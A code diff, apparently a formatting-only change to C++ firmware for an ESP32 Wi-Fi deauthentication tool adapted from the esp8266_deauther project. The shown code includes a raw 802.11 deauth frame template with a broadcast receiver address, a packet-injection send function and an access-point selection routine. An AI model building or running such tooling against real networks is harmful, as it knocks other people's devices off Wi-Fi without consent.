@@ -51,13 +51,32 @@ int Deauth::randomIndex;
  */
 
 uint8_t Deauth::deauthTemp[26] = {
-  /*  0 - 1  */ 0xC0, 0x00, // Type, subtype: c0 => deauth, a0 => disassociate
-  /*  2 - 3  */ 0x00, 0x00, // Duration (handled by the SDK)
-  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
-  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
-  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
-  /* 22 - 23 */ 0x00, 0x00, // Fragment & squence number
-  /* 24 - 25 */ 0x01, 0x00 // Reason code (1 = unspecified reason)
+    /*  0 - 1  */ 0xC0,
+    0x00, // Type, subtype: c0 => deauth, a0 => disassociate
+    /*  2 - 3  */ 0x00,
+    0x00, // Duration (handled by the SDK)
+    /*  4 - 9  */ 0xFF,
+    0xFF,
+    0xFF,
+    0xFF,
+    0xFF,
+    0xFF, // Reciever MAC (To)
+    /* 10 - 15 */ 0xCC,
+    0xCC,
+    0xCC,
+    0xCC,
+    0xCC,
+    0xCC, // Source MAC (From)
+    /* 16 - 21 */ 0xCC,
+    0xCC,
+    0xCC,
+    0xCC,
+    0xCC,
+    0xCC, // BSSID MAC (From)
+    /* 22 - 23 */ 0x00,
+    0x00, // Fragment & squence number
+    /* 24 - 25 */ 0x01,
+    0x00 // Reason code (1 = unspecified reason)
 };
 
 uint8_t Deauth::deauthFrame[26];
@@ -106,13 +125,14 @@ void Deauth::list() {
 bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
   esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, sys_seq);
   delay(102);
-  
+
   return (err == ESP_OK);
 }
 
 /**
  * Check if packet source address is a broadcast
- * source: https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
+ * source:
+ * https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
  * @param mac Mac address to check
  */
 bool Deauth::broadcast(uint8_t *mac) {
@@ -146,7 +166,8 @@ String Deauth::printMacStr(uint8_t *mac) {
 }
 
 /**
- * Selects an AP to deauth, returns a boolean based on if the scan and selection was successful
+ * Selects an AP to deauth, returns a boolean based on if the scan and selection
+ * was successful
  */
 bool Deauth::select() {
   // reset values
